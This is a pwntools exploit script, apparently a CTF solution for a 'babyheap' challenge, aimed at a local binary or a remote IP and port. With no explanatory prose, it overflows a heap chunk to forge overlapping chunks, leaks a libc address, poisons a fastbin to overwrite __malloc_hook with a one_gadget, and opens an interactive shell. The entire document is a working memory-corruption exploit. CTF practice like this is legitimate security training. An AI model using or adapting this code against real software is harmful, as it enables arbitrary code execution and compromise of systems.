from pwn import *
import sys

if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./babyheap")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	elf = ELF("./babyheap")
else:
	p = remote("111.198.29.45",32377)
	libc = ELF("./libc-2.23.so")
	elf = ELF("./babyheap")

def add(size,content):
	p.sendlineafter(">> ","1")
	p.sendline(str(size))
	p.send(content)

def edit(index,size,content):
	p.sendlineafter(">> ","2")
	p.sendline(str(index))
	p.sendline(str(size))
	p.send(content)

def show(index):
	p.sendlineafter(">> ","3")
	p.sendline(str(index))

def free(index):
	p.sendlineafter(">> ","4")
	p.sendline(str(index))


def debugf():
	code_base = 0x555555554000
	gdb.attach(p,"b *{b1}\nb exit".format(b1=hex(code_base+0xBB7)))

context.log_level = "debug"
context.terminal = ["tmux","splitw","-v"]

#debugf()
add(0x80,"a"*0x80)
add(0x80,"b"*0x80)
add(0x80,"c"*0x80)
add(0x60,"f"*0x60)
payload = "d"*0x80 + p64(0) + p64(0x90+0x90+1)
edit(0,len(payload),payload)
free(1)
payload = "e"*0x80 + p64(0) + p64(0x91)
add(0x80+0x80+0x10,payload.ljust(0x80+0x80+0x10,"g"))
free(2)
show(1)
p.recv(0x90)
info_leak = u64(p.recv(6).ljust(8,"\x00"))
libc.address = info_leak - 0x10 - 88 - libc.symbols["__malloc_hook"]
log.success("libc_base:"+hex(libc.address))

#debugf()
size = 0x60
add(size,"1"*size)
add(size,"2"*size)
if debug:
	one_gadget = libc.address + 0x4526a
else:
	one_gadget = libc.address + 0x4526a
payload = "f"*0x60 + p64(0) + p64(0x71) + p64(libc.symbols["__malloc_hook"]-0x23)
free(4)
edit(3,len(payload),payload)
add(size,"1"*size)
payload = "aaa" + p64(0)*2 + p64(one_gadget)
add(size,payload.ljust(size,"\x00"))
p.sendlineafter(">> ","1")
p.sendline(str(10))
p.interactive()
